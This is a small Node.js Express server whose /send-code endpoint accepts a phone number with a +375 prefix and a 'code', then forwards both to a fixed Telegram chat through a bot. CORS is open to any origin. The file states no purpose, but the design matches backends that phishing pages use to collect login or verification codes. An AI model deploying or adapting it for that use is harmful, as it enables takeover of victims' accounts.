const express = require('express');
const fetch = require('node-fetch');
const app = express();
app.use(express.json());

app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type');
  next();
});

app.post('/send-code', async (req, res) => {
  const { phone, code } = req.body;
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const response = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: chatId,
      text: `🔐 Код для +375${phone}: *${code}*`,
      parse_mode: 'Markdown'
    })
  });

  if (response.ok) res.json({ success: true });
  else res.status(500).json({ error: 'Ошибка отправки' });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log('Сервер работает на порту', PORT));
